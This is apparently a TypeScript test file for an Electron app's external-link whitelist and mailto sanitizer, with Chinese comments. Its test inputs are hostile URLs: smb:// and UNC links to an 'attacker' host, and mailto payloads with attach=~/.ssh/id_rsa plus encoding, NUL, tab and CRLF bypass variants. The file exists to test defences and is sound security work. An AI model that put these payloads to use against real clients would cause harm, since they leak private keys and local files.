// topic 49 第六 session · P2(安全):windowOpenHandler 的 deny 分支裸调 shell.openExternal。
//
// 根因:shell.service 有 OPEN_EXTERNAL_SCHEME_WHITELIST(仅 http/https/mailto/file),
// openExternalUrl 会先过白名单。但 index.ts 的 windowOpenHandler deny 分支(所有
// target="_blank" 锚点点击都走这里,含 marketplace 不受信的 authorUrl / 评论 url)
// 旧实现裸调 `shell.openExternal(url)`,完全绕过白名单 → 攻击者控制 index 仓 / 评论
// 内容投放 `smb://attacker/share`、自定义协议 URL,用户点链接即由 OS 协议处理器打开。
// 修复:抽 isAllowedExternalUrl 共享断言,windowOpenHandler deny 分支先过白名单。
// 本 spec:① 断言断言本身的 scheme 判定;② 静态守卫 index.ts deny 分支已接入白名单。

import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import {
  isAllowedExternalUrl,
  sanitizeExternalUrl,
} from '../../../electron/main/services/shell.service';
import { MAX_EXTERNAL_URL_LEN } from '../../../electron/shared/url-limits';

const ROOT = join(__dirname, '..', '..', '..');

describe('topic49 6thS · external URL scheme whitelist', () => {
  it('放行 http/https/mailto', () => {
    expect(isAllowedExternalUrl('https://github.com/x/y')).toBe(true);
    expect(isAllowedExternalUrl('http://example.com')).toBe(true);
    expect(isAllowedExternalUrl('mailto:a@b.com')).toBe(true);
  });

  it('scheme 白名单走字符扫描,不调用 RegExp.test', () => {
    const testSpy = vi.spyOn(RegExp.prototype, 'test');
    try {
      expect(isAllowedExternalUrl('HTTPS://github.com/x/y')).toBe(true);
      expect(isAllowedExternalUrl('MAILTO:a@b.com')).toBe(true);
      expect(isAllowedExternalUrl('javascript:alert(1)')).toBe(false);
      expect(testSpy).not.toHaveBeenCalled();
    } finally {
      testSpy.mockRestore();
    }
  });

  it('安全 S6:拒绝 file:(含 UNC)—— 远程不受信数据(marketplace authorUrl 等)不得经 OS 打开本地文件', () => {
    expect(isAllowedExternalUrl('file:///etc/hosts')).toBe(false);
    expect(isAllowedExternalUrl('file:///Applications/Calculator.app')).toBe(false);
    expect(isAllowedExternalUrl('file://attacker/share')).toBe(false); // Windows UNC 外连
    expect(isAllowedExternalUrl('FILE:///etc/passwd')).toBe(false); // 大小写
  });

  it('拒绝非 http(s) 协议(投放面)', () => {
    expect(isAllowedExternalUrl('smb://attacker/share')).toBe(false);
    expect(isAllowedExternalUrl('javascript:alert(1)')).toBe(false);
    expect(isAllowedExternalUrl('vscode://x')).toBe(false);
    expect(isAllowedExternalUrl('custom-scheme://payload')).toBe(false);
    expect(isAllowedExternalUrl('  https://x')).toBe(false); // 前导空格不放行
  });

  it('静态守卫:index.ts windowOpenHandler 的 shell.openExternal 已被 isAllowedExternalUrl 门控', () => {
    const src = readFileSync(join(ROOT, 'electron/main/index.ts'), 'utf-8');
    // import 了共享断言
    expect(src).toMatch(/isAllowedExternalUrl/);
    // 不再出现裸 `shell.openExternal(url);` 顶格调用(必须包在 if 守卫内)
    // 且交出前过 sanitizeExternalUrl(mailto 去 attach,安全 L4)
    expect(src).toMatch(
      /if \(isAllowedExternalUrl\(url\)\)\s*\{\s*shell\.openExternal\(sanitizeExternalUrl\(url\)\)/,
    );
    expect(src).not.toMatch(/shell\.openExternal\(url\)/);
  });

  // 边界(E190):windowOpenHandler 在 new URL / openExternal 之前先做 url 长度上限(共享
  // MAX_EXTERNAL_URL_LEN),防超长 url 大字符串解析 + 交系统协议处理器。index.ts 不可直接 import
  //(顶层 app 副作用,E146),静态守卫 + 断言共享常量与 openExternal schema 同源。
  it('E190 windowOpenHandler 在 new URL 前有 url 长度上限(共享 MAX_EXTERNAL_URL_LEN)', () => {
    const src = readFileSync(join(ROOT, 'electron/main/index.ts'), 'utf-8');
    expect(src).toMatch(/MAX_EXTERNAL_URL_LEN/);
    // 长度守卫出现在 URL 解析之前(否则超长 url 仍先全量解析)。解析在 isOwnRendererWindowUrl 里
    //(window-open-policy,经 index.ts 的 isOwnRendererUrl 包一层),所以守卫必须先于对它的调用。
    const guardIdx = src.indexOf('url.length > MAX_EXTERNAL_URL_LEN');
    const newUrlIdx = src.indexOf('const allow = isOwnRendererUrl(');
    expect(guardIdx).toBeGreaterThan(-1);
    expect(newUrlIdx).toBeGreaterThan(-1);
    expect(guardIdx).toBeLessThan(newUrlIdx);
  });

  it('E190 MAX_EXTERNAL_URL_LEN 共享常量 = 2048(与 openExternal schema / Markdown 外链同源)', () => {
    expect(MAX_EXTERNAL_URL_LEN).toBe(2048);
  });
});

// 安全 L4:mailto 的 attach / attachment 参数会让部分邮件客户端静默附加本地文件(Evolution CVE-2020-11879、
// KMail CVE-2020-11880)。不受信 markdown / 终端输出链接 `mailto:x@evil?attach=~/.ssh/id_rsa` 经 xdg-open 交出
// → 私钥随邮件外发。主进程 openExternal 统一出口净化后再打开(各平台)。
// 净化是**白名单**:只保留 to / cc / bcc / subject / body / in-reply-to(RFC 6068 常用头),其余参数一律丢弃,
// 且不保留 fragment —— 黑名单曾被 `#&attach=`(不识别 fragment 的客户端当参数)与 `attach%00=`(键解码后
// 带 NUL,不等于 attach)绕过。
describe('安全 L4 · mailto 参数白名单', () => {
  it('删除 attach / attachment(大小写不敏感),保留白名单参数', () => {
    expect(sanitizeExternalUrl('mailto:x@evil?attach=~/.ssh/id_rsa')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?subject=hi&ATTACH=/etc/passwd&body=b')).toBe(
      'mailto:x@evil?subject=hi&body=b',
    );
    expect(sanitizeExternalUrl('MAILTO:x@evil?Attachment=/a&attachment=/b')).toBe('MAILTO:x@evil');
  });

  it('编码变体:键名百分号编码 / 双重编码 / ; 分隔 / 解码失败', () => {
    expect(sanitizeExternalUrl('mailto:x@evil?%61ttach=/etc/passwd')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?%2561ttach=/etc/passwd')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?%20attach%20=/etc/passwd')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?subject=a;attach=/etc/passwd')).toBe('mailto:x@evil?subject=a');
    expect(sanitizeExternalUrl('mailto:x@evil?attach%3D/etc/passwd&subject=s')).toBe('mailto:x@evil?subject=s');
    // 无法解码的键名 / 值 → fail-closed 删除
    expect(sanitizeExternalUrl('mailto:x@evil?%E0%A4%A=1&subject=s')).toBe('mailto:x@evil?subject=s');
    expect(sanitizeExternalUrl('mailto:x@evil?subject=%E0%A4%A&body=b')).toBe('mailto:x@evil?body=b');
  });

  it('`#` 之后一律丢弃:不识别 fragment 的客户端会把 `#&attach=` 当参数', () => {
    expect(sanitizeExternalUrl('mailto:a@b?subject=x#&attach=/home/u/.ssh/id_rsa')).toBe('mailto:a@b?subject=x');
    expect(sanitizeExternalUrl('mailto:a@b#?attach=/home/u/.ssh/id_rsa')).toBe('mailto:a@b');
    expect(sanitizeExternalUrl('mailto:a@b?#attach=/x')).toBe('mailto:a@b?');
    expect(sanitizeExternalUrl('mailto:a@b?attach=/x#f')).toBe('mailto:a@b');
    expect(sanitizeExternalUrl('mailto:a@b#frag')).toBe('mailto:a@b');
  });

  it('键解码后带控制字符(attach%00)不再漏过;未知头一律丢弃', () => {
    expect(sanitizeExternalUrl('mailto:a@b?attach%00=/home/u/.ssh/id_rsa')).toBe('mailto:a@b');
    expect(sanitizeExternalUrl('mailto:a@b?attach%09=/x&attach%7F=/y&%00attach=/z')).toBe('mailto:a@b');
    expect(sanitizeExternalUrl('mailto:a@b?x-foo=1&subject=s&from=evil@x&X-Mailer=y')).toBe('mailto:a@b?subject=s');
    // 白名单键本身前后带编码控制字符也丢弃(不靠 trim 把它洗成合法键)
    expect(sanitizeExternalUrl('mailto:a@b?%0Asubject=s&%00body=b&cc=c@d')).toBe('mailto:a@b?cc=c@d');
  });

  it('值解码后含控制字符的参数丢弃;body 里的换行 / Tab(%0D %0A %09)是合法正文,保留', () => {
    expect(sanitizeExternalUrl('mailto:a@b?subject=s%00x&body=b')).toBe('mailto:a@b?body=b');
    expect(sanitizeExternalUrl('mailto:a@b?subject=s%0D%0ABcc:evil@x&body=b')).toBe('mailto:a@b?body=b');
    expect(sanitizeExternalUrl('mailto:a@b?body=b%00&cc=c@d%7F&bcc=e@f')).toBe('mailto:a@b?bcc=e@f');
    const multiline = 'mailto:a@b?subject=s&body=line1%0Aline2%0D%0Aline3%09tab';
    expect(sanitizeExternalUrl(multiline)).toBe(multiline);
  });

  it('没有被丢弃内容的 mailto 逐字节不变:白名单全集 / 大小写 / to 重复 / 空 query / 空段', () => {
    for (const url of [
      'mailto:a@b.com',
      'mailto:a@b.com?',
      'mailto:a@b.com?subject=see%20attachment&body=x',
      'mailto:?to=a@b&to=c@d&TO=e@f',
      'mailto:a@b?cc=c@d&bcc=e@f&Subject=S&BODY=b&In-Reply-To=%3Cid@x%3E&%73ubject=t',
      'mailto:a@b?subject=a&&body=b&',
      'mailto:a@b?subject', // 无 = 的白名单键
      'mailto:a@b?%20subject%20=s', // 首尾空白归一后仍是 subject
    ]) {
      expect(sanitizeExternalUrl(url)).toBe(url);
    }
  });

  it('; 也当分隔符:其后的段按同一白名单过滤(body 里未编码的 ; 之后若不是白名单键则被截掉)', () => {
    expect(sanitizeExternalUrl('mailto:x@evil?body=a;b&attach=/x')).toBe('mailto:x@evil?body=a');
    expect(sanitizeExternalUrl('mailto:x@evil?subject=a;body=b')).toBe('mailto:x@evil?subject=a;body=b');
    expect(sanitizeExternalUrl('mailto:x@evil?body=a%3Bb')).toBe('mailto:x@evil?body=a%3Bb');
  });

  it('非 mailto URL 原样返回(含 # 与 attach)', () => {
    expect(sanitizeExternalUrl('https://x.test/?attach=1#&attach=2')).toBe('https://x.test/?attach=1#&attach=2');
    expect(sanitizeExternalUrl('http://x.test/#f')).toBe('http://x.test/#f');
  });

  it('openExternalUrl(IPC 出口)交给系统的是净化后的 URL', async () => {
    vi.resetModules();
    const openExternal = vi.fn(async () => undefined);
    vi.doMock('electron', () => ({ shell: { openExternal } }));
    try {
      const mod = await import('../../../electron/main/services/shell.service');
      await mod.openExternalUrl({ url: 'mailto:x@evil?attach%00=~/.ssh/id_rsa&subject=s#&attach=/x' });
      expect(openExternal).toHaveBeenCalledWith('mailto:x@evil?subject=s');
    } finally {
      vi.doUnmock('electron');
      vi.resetModules();
    }
  });
});

// 安全:shell.openExternal 把 URL 交 GURL 解析时按 URL 规范先删掉 Tab / CR / LF。若净化在删之前做,
// `mailto:x?att<TAB>ach=~/.ssh/id_rsa` 的键是 `att\tach` 不被删,交出后却变成 attach → 绕过 L4。
// 正常外链(Markdown 链接目标 / 终端链接 / Chromium 规范化后的 window.open URL)不含 C0 控制字符与 DEL,
// 故所有 scheme 一律拒绝含这类字符的外链(fail-closed),而不是猜测下游如何剥离。
describe('安全 · 外链含 C0 控制字符 / DEL 一律拒绝', () => {
  it('Tab / CR / LF / NUL / DEL 拼进键名或任意位置 → 拒绝(各 scheme)', () => {
    expect(isAllowedExternalUrl('mailto:x@evil?att\tach=~/.ssh/id_rsa')).toBe(false);
    expect(isAllowedExternalUrl('mailto:x@evil?att\nach=~/.ssh/id_rsa')).toBe(false);
    expect(isAllowedExternalUrl('mailto:x@evil?att\r\nach=~/.ssh/id_rsa')).toBe(false);
    expect(isAllowedExternalUrl('https://x.test/\u0000a')).toBe(false);
    expect(isAllowedExternalUrl('http://x.test/a\u007f')).toBe(false);
    expect(isAllowedExternalUrl('ht\ttps://x.test/')).toBe(false);
    expect(isAllowedExternalUrl('https://x.test/\u001f')).toBe(false);
  });

  it('正常链接(含空格 / 百分号编码的 %09 / 非 ASCII)不受影响', () => {
    expect(isAllowedExternalUrl('https://x.test/a b')).toBe(true);
    expect(isAllowedExternalUrl('mailto:a@b.com?subject=a%09b')).toBe(true);
    expect(isAllowedExternalUrl('https://例子.测试/路径?q=值')).toBe(true);
  });

  it('openExternalUrl(IPC 出口)拒绝且不调用 shell.openExternal', async () => {
    vi.resetModules();
    const openExternal = vi.fn(async () => undefined);
    vi.doMock('electron', () => ({ shell: { openExternal } }));
    try {
      const mod = await import('../../../electron/main/services/shell.service');
      await expect(mod.openExternalUrl({ url: 'mailto:x@evil?att\tach=~/.ssh/id_rsa' })).rejects.toThrow();
      expect(openExternal).not.toHaveBeenCalled();
    } finally {
      vi.doUnmock('electron');
      vi.resetModules();
    }
  });
});
